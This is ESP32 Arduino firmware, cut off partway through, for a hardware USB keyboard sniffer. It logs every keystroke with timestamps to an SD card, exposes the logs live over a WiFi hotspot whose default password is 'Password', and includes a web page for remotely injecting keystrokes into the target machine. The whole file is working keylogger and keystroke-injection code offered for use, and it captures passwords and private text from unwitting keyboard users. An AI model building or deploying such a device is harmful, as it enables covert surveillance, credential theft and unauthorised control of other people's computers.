#include <Arduino.h>
#include "FS.h"
#include "SD_MMC.h"
#include <WiFi.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include <ESP32Time.h>
#include <ctype.h> 
#include <ArduinoJson.h>

ESP32Time rtc(0);

const char* ssid = "UsbKeyboardSniffer";
const char* password = "Password"; // cahnge this as you like

WebServer server(80);

IPAddress local_IP(192, 168, 1, 184); 
IPAddress gateway(192, 168, 1, 1);    
IPAddress subnet(255, 255, 255, 0);   




#define QWERTY_KEYBOARD // unmark if you want azerty layout
#ifdef QWERTY_KEYBOARD
static  const  uint8_t  HID_KEYBRD_Key[] =
{
  '\0',  '`',  '1',  '2',  '3',  '4',  '5',  '6',
  '7',  '8',  '9',  '0',  '-',  '=',  '\0', '\r',
  '\t',  'q',  'w',  'e',  'r',  't',  'y',  'u',
  'i',  'o',  'p',  '[',  ']',  '\\',
  '\0',  'a',  's',  'd',  'f',  'g',  'h',  'j',
  'k',  'l',  ';',  '\'', '\0', '\n',
  '\0',  '\0', 'z',  'x',  'c',  'v',  'b',  'n',
  'm',  ',',  '.',  '/',  '\0', '\0',
  '\0',  '\0', '\0', ' ',  '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0',  '\0', '\0', '\0', '\0', '\r', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0',
  '\0',  '\0', '7',  '4',  '1',
  '\0',  '/',  '8',  '5',  '2',
  '0',   '*',  '9',  '6',  '3',
  '.',   '-',  '+',  '\0', '\n', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0',  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0'
};


static  const  uint8_t  HID_KEYBRD_ShiftKey[] =
{
  '\0', '~',  '!',  '@',  '#',  '$',  '%',  '^',  '&',  '*',  '(',  ')',
  '_',  '+',  '\0', '\0', '\0', 'Q',  'W',  'E',  'R',  'T',  'Y',  'U',
  'I',  'O',  'P',  '{',  '}',  '|',  '\0', 'A',  'S',  'D',  'F',  'G',
  'H',  'J',  'K',  'L',  ':',  '"',  '\0', '\n', '\0', '\0', 'Z',  'X',
  'C',  'V',  'B',  'N',  'M',  '<',  '>',  '?',  '\0', '\0',  '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0',    '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0'
};

#else

static  const  uint8_t  HID_KEYBRD_Key[] =
{
  '\0',  '`',  '1',  '2',  '3',  '4',  '5',  '6',  '7',  '8',  '9',  '0',
  '-',  '=',  '\0', '\r', '\t',  'a',  'z',  'e',  'r',  't',  'y',  'u',
  'i',  'o',  'p',  '[',  ']', '\\', '\0',  'q',  's',  'd',  'f',  'g',
  'h',  'j',  'k',  'l',  'm',  '\0', '\0', '\n', '\0',  '\0', 'w',  'x',
  'c',  'v',  'b',  'n',  ',',  ';',  ':',  '!',  '\0', '\0', '\0',  '\0',
  '\0', ' ',  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0',  '\0', '\0', '\0', '\0', '\r', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0',  '\0', '7',  '4',  '1', '\0',  '/',
  '8',  '5',  '2', '0',   '*',  '9',  '6',  '3', '.',   '-',  '+',  '\0',
  '\n', '\0', '\0', '\0', '\0', '\0', '\0', '\0',  '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0'
};

static  const  uint8_t  HID_KEYBRD_ShiftKey[] =
{
  '\0', '~',  '!',  '@',  '#',  '$',  '%',  '^',  '&',  '*',  '(',  ')',  '_',
  '+',  '\0', '\0', '\0', 'A',  'Z',  'E',  'R',  'T',  'Y',  'U',  'I',  'O',
  'P',  '{',  '}',  '*', '\0', 'Q',  'S',  'D',  'F',  'G',  'H',  'J',  'K',
  'L',  'M',  '%',  '\0', '\n', '\0', '\0', 'W',  'X',  'C',  'V',  'B',  'N',
  'M',  '<',  '>',  '\0',  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0'
};
#endif




static  const  uint8_t  HID_KEYBRD_Codes[] =
{
  0,     0,    0,    0,   31,   50,   48,   33,
  19,   34,   35,   36,   24,   37,   38,   39,       /* 0x00 - 0x0F */
  52,    51,   25,   26,   17,   20,   32,   21,
  23,   49,   18,   47,   22,   46,    2,    3,       /* 0x10 - 0x1F */
  4,    5,    6,    7,    8,    9,   10,   11,
  43,  110,   15,   16,   61,   12,   13,   27,       /* 0x20 - 0x2F */
  28,   29,   42,   40,   41,    1,   53,   54,
  55,   30,  112,  113,  114,  115,  116,  117,       /* 0x30 - 0x3F */
  118,  119,  120,  121,  122,  123,  124,  125,
  126,   75,   80,   85,   76,   81,   86,   89,       /* 0x40 - 0x4F */
  79,   84,   83,   90,   95,  100,  105,  106,
  108,   93,   98,  103,   92,   97,  102,   91,       /* 0x50 - 0x5F */
  96,  101,   99,  104,   45,  129,    0,    0,
  0,    0,    0,    0,    0,    0,    0,    0,       /* 0x60 - 0x6F */
  0,    0,    0,    0,    0,    0,    0,    0,
  0,    0,    0,    0,    0,    0,    0,    0,       /* 0x70 - 0x7F */
  0,    0,    0,    0,    0,  107,    0,   56,
  0,    0,    0,    0,    0,    0,    0,    0,       /* 0x80 - 0x8F */
  0,    0,    0,    0,    0,    0,    0,    0,
  0,    0,    0,    0,    0,    0,    0,    0,       /* 0x90 - 0x9F */
  0,    0,    0,    0,    0,    0,    0,    0,
  0,    0,    0,    0,    0,    0,    0,    0,       /* 0xA0 - 0xAF */
  0,    0,    0,    0,    0,    0,    0,    0,
  0,    0,    0,    0,    0,    0,    0,    0,       /* 0xB0 - 0xBF */
  0,    0,    0,    0,    0,    0,    0,    0,
  0,    0,    0,    0,    0,    0,    0,    0,       /* 0xC0 - 0xCF */
  0,    0,    0,    0,    0,    0,    0,    0,
  0,    0,    0,    0,    0,    0,    0,    0,       /* 0xD0 - 0xDF */
  58,   44,   60,  127,   64,   57,   62,  128        /* 0xE0 - 0xE7 */
};






bool CapsLockState = false;

typedef struct
{
char AsciiKeys[6];
String SpecialKey;
bool LeftCtrl;
bool LeftShift;
bool LeftAlt;
bool LeftStart;
bool RightCtrl;
bool RightShift;
bool RightAlt;
bool RightStart;
} Key_InfoStruct;

typedef struct {
    uint8_t state;
    uint8_t lctrl;
    uint8_t lshift;
    uint8_t lalt;
    uint8_t lgui;
    uint8_t rctrl;
    uint8_t rshift;
    uint8_t ralt;
    uint8_t rgui;
    uint8_t keys[6];
} HID_KEYBD_Info_TypeDef;

typedef struct {
    uint8_t MODIFIER;
    uint8_t RESERVED;
    uint8_t KEYCODE1;
    uint8_t KEYCODE2;
    uint8_t KEYCODE3;
    uint8_t KEYCODE4;
    uint8_t KEYCODE5;
    uint8_t KEYCODE6;
} keyboardHID;




uint8_t USBH_HID_GetASCIICode(HID_KEYBD_Info_TypeDef *info,uint8_t keyNumber)
{
  uint8_t   output;
  if ((info->lshift != 0U) || (info->rshift != 0U))
  {
    output =  HID_KEYBRD_ShiftKey[HID_KEYBRD_Codes[info->keys[keyNumber]]];
  }
  else
  {
    output =  HID_KEYBRD_Key[HID_KEYBRD_Codes[info->keys[keyNumber]]];
  }
  return output;
}

const char* hidUsageCodeToString(uint8_t usageCode) {
    switch(usageCode) {
        case 0x2A: return "Backspace";
        case 0x2B: return "Tab";
        case 0x28: return "Enter";
        case 0x29: return "Escape";
      //  case 0x2C: return "Space";
        case 0x4F: return "Right Arrow";
        case 0x50: return "Left Arrow";
        case 0x51: return "Down Arrow";
        case 0x52: return "Up Arrow";
        case 0x4A: return "Home";
        case 0x49: return "Insert";
        case 0x4B: return "Page Up";
        case 0x4E: return "Page Down";
        case 0x4D: return "End";
        case 0x4C: return "Delete"; ///
        case 0x3A: return "F1";
        case 0x3B: return "F2";
        case 0x3C: return "F3";
        case 0x3D: return "F4";
        case 0x3E: return "F5";
        case 0x3F: return "F6";
        case 0x40: return "F7";
        case 0x41: return "F8";
        case 0x42: return "F9";
        case 0x43: return "F10";
        case 0x44: return "F11";
        case 0x45: return "F12";
        case 0x65: return "Menu";
        case 0x82: return "Power";
        case 0x81: return "Sleep";
        case 0x83: return "Wake";
        case 0x39: return "Caps lock"; 
        case 0x58: return "Numpad Enter"; 
        case 0x46: return "Print Screen";
        case 0x47: return "Scroll Lock";
        case 0x48: return "Pause";
        default: return "----";
    }
}

void printKeyInfo(const Key_InfoStruct& keyInfo);
Key_InfoStruct RecvieKeyFromSerial();
keyboardHID KeyInjectionStruct = (keyboardHID){0};
bool isStructZero(const Key_InfoStruct& keyInfo);
void printStructToCSV(const Key_InfoStruct& keyInfo);
void printKeysToTXT(const Key_InfoStruct& keyInfo);
void handleRoot();
void handleReadCSV();
void handleGetCSV();
void handleClearFiles();
void handleDownloadCSV();
void handleShowTXT();
void handleReadTXT();
void handleDownloadTXT();
void handleShowTime();
void handleSetTime() ;
void handleKeyCapturePage();
void handleKeyCapture();
void printKeyboardHIDStatus();
void mapEventCodeToKeyboardHID(const String& eventCode, keyboardHID& hid);
void handleRickRoll();
void typeTheString();
void sendKeyPress(uint8_t keyCode, bool shift);


String Origin;
String receivedKeyCode;

void setup() {
    // Initialize Serial communication for debugging
    Serial.begin(115200);

 Serial2.begin(115200);

//Serial2.begin(115200,SERIAL_8N1,16,0);

#define Hotspot // unmark this if you want to connect to wifi network instead of hotspot

#ifdef Hotspot
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP(ssid, password, 1, 1);  

  Serial.println("Access Point Started");
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());
#else
  WiFi.config(local_IP, gateway, subnet); 
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.println("Connecting to WiFi...");
  }
  Serial.println("Connected to WiFi");
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
#endif


  pinMode(32, OUTPUT);
  digitalWrite(32, LOW);
  delay(1000);
   digitalWrite(32, HIGH);
if (!SD_MMC.begin()) {
    Serial.println("Card Mount Failed");
    return;
  }
  uint8_t cardType = SD_MMC.cardType();

  if (cardType == CARD_NONE) {
    Serial.println("No SD card attached");
    return;
  }
 Serial.println("SD Card mounted successfully");

if (!SPIFFS.begin(true)) {
    Serial.println("An error has occurred while mounting SPIFFS");
    return;
  }

   server.on("/", HTTP_GET, handleRoot);
    server.on("/show-csv", HTTP_GET, handleShowCSV);
    server.on("/read-csv", HTTP_GET, handleReadCSV);
    server.on("/clear-files", HTTP_GET, handleClearFiles); 

    server.on("/download-csv", HTTP_GET, handleDownloadCSV);
        server.on("/show-txt", HTTP_GET, handleShowTXT);
    server.on("/read-txt", HTTP_GET, handleReadTXT);
      server.on("/download-txt", HTTP_GET, handleDownloadTXT);
        server.on("/show-time", HTTP_GET, handleShowTime);
        server.on("/get-time", HTTP_GET, handleGetTime);
        server.on("/set-time", HTTP_POST, handleSetTime);
        server.on("/key-capture-page", HTTP_GET, handleKeyCapturePage);
          server.on("/key-capture", HTTP_POST, handleKeyCapture);
          server.on("/rick-roll", HTTP_GET, handleRickRoll); 
server.on("/rick-roll-page", HTTP_GET, handleRickRollPage); 


  server.begin();


  rtc.setTime(00, 00, 12, 01, 01, 2024);


}





void loop() {
   server.handleClient();
 // Serial2.println("Test");
  //  printKeyboardHIDStatus();
if (Serial2.available() >= sizeof(HID_KEYBD_Info_TypeDef)){
 Key_InfoStruct RecivedData = RecvieKeyFromSerial();
 //printKeyInfo(RecivedData);
 printStructToCSV(RecivedData);
  printKeysToTXT(RecivedData);
}
}

 Key_InfoStruct RecvieKeyFromSerial()
{

Key_InfoStruct temp;
HID_KEYBD_Info_TypeDef receivedData;
  //Read HID_KEYBD_Info_TypeDef from uart
     
        Serial2.readBytes((char*)&receivedData, sizeof(HID_KEYBD_Info_TypeDef));

  for (int i=0;i <= 5;i++)
  {
    temp.AsciiKeys[i] = USBH_HID_GetASCIICode(&receivedData,i);

    if(isalpha(temp.AsciiKeys[i]))
    { 
      if(CapsLockState)
      { 
           if(isupper(temp.AsciiKeys[i]))
          temp.AsciiKeys[i] =  tolower(temp.AsciiKeys[i]);
          else
          temp.AsciiKeys[i] =  toupper(temp.AsciiKeys[i]);
          
      }
    }

    if(temp.AsciiKeys[i] == ' ')
      temp.SpecialKey = "Space";
  }

    if(temp.SpecialKey != "Space")
     temp.SpecialKey = hidUsageCodeToString(receivedData.keys[0]);


 if (temp.SpecialKey == "Caps lock")
  {
    CapsLockState = !CapsLockState;
  }

 


     
     temp.LeftCtrl = (receivedData.lctrl)? true:false;
      temp.LeftShift = (receivedData.lshift)? true:false;
      temp.LeftAlt = (receivedData.lalt)? true:false;
      temp.LeftStart = (receivedData.lgui)? true:false;
      temp.RightCtrl = (receivedData.rctrl)? true:false;
      temp.RightShift = (receivedData. rshift)? true:false;
      temp.RightAlt = (receivedData.ralt)? true:false;
     temp. RightStart = (receivedData.rgui)? true:false;

      return temp;
}

void printKeyInfo(const Key_InfoStruct& keyInfo) {

  if (isStructZero(keyInfo)) {
    return; // Structure is considered zero, so don't print anything
  }

  Serial.println("AsciiKeys with Indexes:");
  for (int i = 0; i < 6; ++i) {
    Serial.print("Index ");
    Serial.print(i);
    Serial.print(": ");
    Serial.println(keyInfo.AsciiKeys[i]);
  }
  
  Serial.print("SpecialKey: ");
  Serial.println(keyInfo.SpecialKey);
  
  Serial.println("Control Keys State (True=Pressed, False=Not Pressed):");
  Serial.print("LeftCtrl: ");
  Serial.println(keyInfo.LeftCtrl ? "True" : "False");
  Serial.print("LeftShift: ");
  Serial.println(keyInfo.LeftShift ? "True" : "False");
  Serial.print("LeftAlt: ");
  Serial.println(keyInfo.LeftAlt ? "True" : "False");
  Serial.print("LeftStart: ");
  Serial.println(keyInfo.LeftStart ? "True" : "False");
  Serial.print("RightCtrl: ");
  Serial.println(keyInfo.RightCtrl ? "True" : "False");
  Serial.print("RightShift: ");
  Serial.println(keyInfo.RightShift ? "True" : "False");
  Serial.print("RightAlt: ");
  Serial.println(keyInfo.RightAlt ? "True" : "False");
  Serial.print("RightStart: ");
  Serial.println(keyInfo.RightStart ? "True" : "False");
 Serial.print("key0: ");
Serial.println((int)keyInfo.AsciiKeys[0]);
}

bool isStructZero(const Key_InfoStruct& keyInfo) {
for (int i =0;i <= 5;i++)
{
  if ((int)keyInfo.AsciiKeys[i] != 0)
  return false;
}
  if (keyInfo.SpecialKey != "----") return false;
  
  // Check if all bool members are false
  if (keyInfo.LeftCtrl || keyInfo.LeftShift || keyInfo.LeftAlt || keyInfo.LeftStart ||
      keyInfo.RightCtrl || keyInfo.RightShift || keyInfo.RightAlt || keyInfo.RightStart) {
    return false;
  }
  return true;
}


void printStructToCSV(const Key_InfoStruct& keyInfo) {
  if (isStructZero(keyInfo)) {
    return; 
  }
  File file = SD_MMC.open("/key_info.csv", FILE_APPEND); 
  if (!file) {
    Serial.println("Error opening file for writing");
    return;
  }
  if (file.size() == 0) {
    file.println("AsciiKeys0,AsciiKeys1,AsciiKeys2,AsciiKeys3,AsciiKeys4,AsciiKeys5,SpecialKey,LeftCtrl,LeftShift,LeftAlt,LeftStart,RightCtrl,RightShift,RightAlt,RightStart,Time,Date");
  }
 for (int i = 0; i < 6; ++i) {
    if (keyInfo.AsciiKeys[i] != '\0') { 
      file.print(keyInfo.AsciiKeys[i]);
    } else {
      file.print("NULL"); 
    }
    file.print(",");
  }
  file.print(keyInfo.SpecialKey); file.print(",");
  file.print(keyInfo.LeftCtrl); file.print(",");
  file.print(keyInfo.LeftShift); file.print(",");
  file.print(keyInfo.LeftAlt); file.print(",");
  file.print(keyInfo.LeftStart); file.print(",");
  file.print(keyInfo.RightCtrl); file.print(",");
  file.print(keyInfo.RightShift); file.print(",");
  file.print(keyInfo.RightAlt); file.print(",");
  file.print(keyInfo.RightStart); file.print(",");
  file.print( rtc.getTime()); file.print(",");
   file.print(rtc.getDate() );

  file.println(); 
  file.close();
}
void printKeysToTXT(const Key_InfoStruct& keyInfo) {
    File file = SD_MMC.open("/key_info.txt", FILE_APPEND); 
    if (!file) {
        Serial.println("Error opening file for writing");
        return;
    }
      if (keyInfo.AsciiKeys[0] == '\0') {
    return; 
  }
        file.print(keyInfo.AsciiKeys[0]);
    file.close(); // Close the file after writing
}


void handleRoot() {
    String html = "<!DOCTYPE html><html><head><title>CSV and TXT Viewer</title></head><body>"
                  "<h1>Welcome to the CSV and TXT Viewer</h1>"
                  "<button onclick=\"window.location.href='/show-csv'\">Show CSV File</button><br/>"
                  "<button onclick=\"window.location.href='/show-txt'\">Show TXT File</button><br/>"
                  "<button onclick=\"window.location.href='/show-time'\">Show Time</button>"
                  "<button onclick=\"window.location='/key-capture-page'\">Key Injection</button><br/>"
                   "<button onclick=\"window.location.href='/rick-roll'\">Activate Rick Roll</button>"
                  "</body></html>";
    server.send(200, "text/html", html);
}

void handleShowCSV() {
    String html = "<!DOCTYPE html><html><head><title>Show CSV</title>"
                  "<style>"
                  "body { display: flex; flex-direction: column; }"
                  "#controls { position: fixed; top: 0; left: 0; background: white; padding: 10px; width: 100%; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 100; }"
                  "#csvContent { margin-top: 50px; padding-bottom: 20px; overflow: auto; }"
                  "</style>"
                  "<script>"
                  "let lastContent = '';"
                  "function fetchCSV() {"
                  "  fetch('/read-csv').then(response => response.text()).then(data => {"
                  "    const content = document.getElementById('csvContent');"
                  "    if (data !== lastContent) {"
                  "      content.innerHTML = data;"
                  "      if (lastContent !== '') {"
                  "        window.scrollTo(0, content.scrollHeight);"
                  "      }"
                  "      lastContent = data;"
                  "    }"
                  "  });"
                  "}"
                  "setInterval(fetchCSV, 20);" // Refresh every 5 seconds
                  "</script>"
                  "</head><body>"
                  "<div id='controls'>"
                  "<button onclick=\"window.location.href='/'\">Back</button>"
                  "<button onclick=\"window.location.href='/clear-files'\">Clear CSV and TXT</button>"
                  "<button onclick=\"window.location.href='/download-csv'\">Download CSV</button>" // Download CSV button
                  "</div>"
                  "<h1>CSV Content</h1>"
                  "<div id='csvContent'>CSV data will appear here...</div>"
                  "</body></html>";
    server.send(200, "text/html", html);
    Origin = "CSV";
}



void handleReadCSV() {
    File file = SD_MMC.open("/key_info.csv", FILE_READ);
    if (!file) {
        server.send(500, "text/plain", "Failed to open CSV file.");
        return;
    }

    String fileContent = "<table>";
    while (file.available()) {
        String line = file.readStringUntil('\n');
        fileContent += "<tr>";
        int pos = 0;
        while ((pos = line.indexOf(',')) != -1) {
            String cell = line.substring(0, pos);
            fileContent += "<td>" + cell + "</td>";
            line = line.substring(pos + 1);
        }
        fileContent += "<td>" + line + "</td>"; // Last cell
        fileContent += "</tr>";
    }
    fileContent += "</table>";
    file.close();

    server.send(200, "text/html", fileContent);
}



void handleClearFiles() {
    // Clear CSV file
    File fileCSV = SD_MMC.open("/key_info.csv", FILE_WRITE);
    if (fileCSV) {
        fileCSV.print("");
        fileCSV.close();
    }

    // Clear TXT file
    File fileTXT = SD_MMC.open("/key_info.txt", FILE_WRITE);
    if (fileTXT) {
        fileTXT.print("");
        fileTXT.close();
    }
        if(Origin == "TXT")
        server.sendHeader("Location", "/show-txt", true);
        else
        server.sendHeader("Location", "/show-csv", true);
        server.send(302, "text/plain", "");
}




void handleDownloadCSV() {
  if (SD_MMC.exists("/key_info.csv")) {
    File file = SD_MMC.open("/key_info.csv", FILE_READ);
    if (!file) {
      server.send(500, "text/plain", "Failed to open CSV file.");
      return;
    }

    server.sendHeader("Content-Type", "text/csv");
    server.sendHeader("Content-Disposition", "attachment; filename=key_info.csv");
    server.sendHeader("Connection", "close");
    server.streamFile(file, "text/csv");
    file.close();
  } else {
    server.send(404, "text/plain", "CSV file not found.");
  }
}
void handleShowTXT() {
    String html = "<!DOCTYPE html><html><head><title>Show TXT</title>"
                  "<script>"
                  "function fetchTXT() {"
                  "  fetch('/read-txt').then(response => response.text()).then(data => {"
                  "    document.getElementById('txtContent').innerText = data;"
                  "  });"
                  "}"
                  "setInterval(fetchTXT, 20);"
                  "</script>"
                  "</head><body>"
                  "<h1>TXT Content</h1>"
                  "<div id='txtContent' style='white-space: pre-wrap;'>TXT data will appear here...</div>"
                  "<button onclick=\"window.location.href='/'\">Back</button>"
                  "<button onclick=\"window.location.href='/clear-files'\">Clear CSV and TXT</button>"
                  "<button onclick=\"window.location.href='/download-txt'\">Download TXT</button>" 
                  "</body></html>";
    server.send(200, "text/html", html);
    Origin = "TXT";
}



void handleReadTXT() {
    if (SD_MMC.exists("/key_info.txt")) {
        File file = SD_MMC.open("/key_info.txt", FILE_READ);
        if (!file) {
            server.send(500, "text/plain", "Failed to open TXT file.");
            return;
        }

        String fileContent;
        while (file.available()) {
            fileContent += (char)file.read();
        }
        file.close();
        server.send(200, "text/plain", fileContent);
    } else {
        server.send(404, "text/plain", "TXT file not found.");
    }
}


void handleDownloadTXT() {
  if (SD_MMC.exists("/key_info.txt")) {
    File file = SD_MMC.open("/key_info.txt", FILE_READ);
    if (!file) {
      server.send(500, "text/plain", "Failed to open TXT file.");
      return;
    }

    server.sendHeader("Content-Type", "text/plain");
    server.sendHeader("Content-Disposition", "attachment; filename=key_info.txt");
    server.sendHeader("Connection", "close");
    server.streamFile(file, "text/plain");
    file.close();
  } else {
    server.send(404, "text/plain", "TXT file not found.");
  }
}


void handleShowTime() {
    String html = 
"<!DOCTYPE html>\n"
"<html>\n"
"<head>\n"
"<title>Set Current Time</title>\n"
"<style>\n"
"  form div { display: inline-block; margin-right: 10px; }\n" 
"</style>\n"
"<script>\n"
"function updateTime() {\n"
"  fetch('/get-time')\n"
"    .then(response => response.text())\n"
"    .then(data => {\n"
"      document.getElementById('time').innerText = data;\n"
"    });\n"
"}\n"
"setInterval(updateTime, 1000);\n"
"function setBrowserTime() {\n"
"  var now = new Date();\n"
"  document.getElementsByName('hour')[0].value = now.getHours();\n"
"  document.getElementsByName('minute')[0].value = now.getMinutes();\n"
"  document.getElementsByName('second')[0].value = now.getSeconds(); \n"
"  document.getElementsByName('day')[0].value = now.getDate();\n"
"  document.getElementsByName('month')[0].value = now.getMonth() + 1;\n" // JavaScript months are 0-11
"  document.getElementsByName('year')[0].value = now.getFullYear();\n"
"}\n"
"</script>\n"
"</head>\n"
"<body onload='updateTime()'>\n"
"<h1>Set Current Time</h1>\n"
"<p id='time'></p>\n"
"<form action='/set-time' method='post'>\n"
"  <div><input type='number' name='hour' placeholder='Hour ' min='0' max='23' required></div>\n"
"  <div><input type='number' name='minute' placeholder='Minute ' min='0' max='59' required></div>\n"
"  <div><input type='number' name='second' placeholder='Second ' min='0' max='59' required></div>\n"
"  <div><input type='number' name='day' placeholder='Day ' min='1' max='31' required></div>\n"
"  <div><input type='number' name='month' placeholder='Month ' min='1' max='12' required></div>\n"
"  <div><input type='number' name='year' placeholder='Year ' min='2000' max='2099' required></div>\n"
"  <input type='submit' value='Set Time'>\n"
"</form>\n"
"<button onclick='setBrowserTime()'>Get Browser Time and Date</button>\n"
"<button onclick=\"window.location.href='/'\">Back</button>\n"
"</body>\n"
"</html>";

    server.send(200, "text/html", html);
}





void handleGetTime() {
    // Get the current date and time components
    int day = rtc.getDay();
    int month = rtc.getMonth() + 1; // Adding 1 because getMonth() returns 0-11
    int year = rtc.getYear();
    String currentTime = rtc.getTime(); // Get the current time as a string

    // Format the date and time in the desired format "Date: DD/MM/YYYY HH:MM:SS"
    String formattedDateTime = "Date: " + String(day) + "/" + String(month) + "/" + String(year) + " " + "Time: " + currentTime;

    server.send(200, "text/plain", formattedDateTime);
}

void handleSetTime() {
    // Check if all fields are provided
    if (server.hasArg("day") && server.hasArg("month") && server.hasArg("year") &&
        server.hasArg("hour") && server.hasArg("minute") && server.hasArg("second")) {
        
        // Extract the date and time values
        int day = server.arg("day").toInt();
        int month = server.arg("month").toInt() - 1; // Adjust month value for ESP32Time
        int year = server.arg("year").toInt();
        int hour = server.arg("hour").toInt();
        int minute = server.arg("minute").toInt();
        int second = server.arg("second").toInt();

        // Set the new time
        rtc.setTime(second, minute, hour, day, month, year);

        // Redirect back to the time page
        server.sendHeader("Location", "/show-time", true);
        server.send(302, "text/plain", "");
    } else {
        server.send(400, "text/plain", "Missing date or time parameter.");
    }
}
void handleKeyCapturePage() {
    String htmlContent = 
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
        "<title>Key Capture Page</title>"
        "<style>"
            ".modifiers { display: flex; justify-content: start; align-items: flex-start; }"
            ".modifiers > div { margin-right: 20px; }" 
            "label { display: block; margin: 5px 0; }" 
            "#message { display: none; position: absolute; top: 20px; right: 20px; padding: 10px; background-color: #90ee90; border-radius: 8px; }"
        "</style>"
    "</head>"
    "<body>"
        "<h1>Key Injection Page</h1>"
        "<h2>Press buttons to inject</h2>"
        "<p>&bull; Mobile not supported</p>"
        "<p>&bull; If you want to send a single control button press the control buttons</p>"
        "<p>&bull; If you want to send control buttons and another button check one of the check boxes and press the other button</p>"
        "<div id='message'>Key pressed was sent</div>"
        "<div class='modifiers'>"
            "<div class='left'>"
                "<label><input type='checkbox' id='ControlLeft' value='ControlLeft'> Left Ctrl</label>"
                "<label><input type='checkbox' id='ShiftLeft' value='ShiftLeft'> Left Shift</label>"
                "<label><input type='checkbox' id='AltLeft' value='AltLeft'> Left Alt</label>"
                "<label><input type='checkbox' id='MetaLeft' value='MetaLeft'> Left Start (GUI)</label>"
            "</div>"
            "<div class='right'>"
                "<label><input type='checkbox' id='ControlRight' value='ControlRight'> Right Ctrl</label>"
                "<label><input type='checkbox' id='ShiftRight' value='ShiftRight'> Right Shift</label>"
                "<label><input type='checkbox' id='AltRight' value='AltRight'> Right Alt</label>"
                "<label><input type='checkbox' id='MetaRight' value='MetaRight'> Right Start (GUI)</label>"
            "</div>"
        "</div>"
        "<script>"
            "document.addEventListener('keydown', (event) => {"
                "const modifiers = {"
                    "ControlLeft: document.getElementById('ControlLeft').checked,"
                    "ShiftLeft: document.getElementById('ShiftLeft').checked,"
                    "AltLeft: document.getElementById('AltLeft').checked,"
                    "MetaLeft: document.getElementById('MetaLeft').checked,"
                    "ControlRight: document.getElementById('ControlRight').checked,"
                    "ShiftRight: document.getElementById('ShiftRight').checked,"
                    "AltRight: document.getElementById('AltRight').checked,"
                    "MetaRight: document.getElementById('MetaRight').checked"
                "};"
                "const keyData = {"
                    "code: event.code,"
                    "modifiers: modifiers"
                "};"
                "fetch('/key-capture', {"
                    "method: 'POST',"
                    "headers: { 'Content-Type': 'application/json' },"
                    "body: JSON.stringify(keyData)"
                "})"
                ".then(response => {"
                    "if (!response.ok) throw new Error('Network response was not ok');"
                    "return response.json();"
                "})"
                ".then(data => {"
                    "console.log(data);"
                    "document.getElementById('message').style.display = 'block';"
                    "setTimeout(function() { document.getElementById('message').style.display = 'none'; }, 1000);"
                "})"
                ".catch(error => console.error('Error:', error));"
                "event.preventDefault();" 
            "}, false);"
        "</script>"
    "</body>"
    "</html>";

    server.send(200, "text/html", htmlContent);
}








void handleKeyCapture() {
    if (server.method() != HTTP_POST) {
        Serial.println("Wrong HTTP method");
        server.send(405, "text/plain", "Method Not Allowed");
        return;
    }

    String requestBody = server.arg("plain");

    DynamicJsonDocument doc(256);
    DeserializationError error = deserializeJson(doc, requestBody);

    if (error) {
        server.send(400, "text/plain", "Bad Request: Invalid JSON");
        return;
    }

    receivedKeyCode = doc["code"].as<String>();

    bool controlLeft = doc["modifiers"]["ControlLeft"].as<bool>();
    bool shiftLeft = doc["modifiers"]["ShiftLeft"].as<bool>();
    bool altLeft = doc["modifiers"]["AltLeft"].as<bool>();
    bool metaLeft = doc["modifiers"]["MetaLeft"].as<bool>(); 
    bool controlRight = doc["modifiers"]["ControlRight"].as<bool>();
    bool shiftRight = doc["modifiers"]["ShiftRight"].as<bool>();
    bool altRight = doc["modifiers"]["AltRight"].as<bool>();
    bool metaRight = doc["modifiers"]["MetaRight"].as<bool>(); 






    server.send(200, "application/json", "{\"status\":\"received\"}");
    mapEventCodeToKeyboardHID(receivedKeyCode, KeyInjectionStruct);
    if (controlLeft) KeyInjectionStruct.MODIFIER |= 0x01;
    if (shiftLeft)   KeyInjectionStruct.MODIFIER |= 0x02;
    if (altLeft)     KeyInjectionStruct.MODIFIER |= 0x04;
    if (metaLeft)    KeyInjectionStruct.MODIFIER |= 0x08;
    if (controlRight) KeyInjectionStruct.MODIFIER |= 0x10;
    if (shiftRight)   KeyInjectionStruct.MODIFIER |= 0x20;
    if (altRight)     KeyInjectionStruct.MODIFIER |= 0x40;
    if (metaRight)    KeyInjectionStruct.MODIFIER |= 0x80;
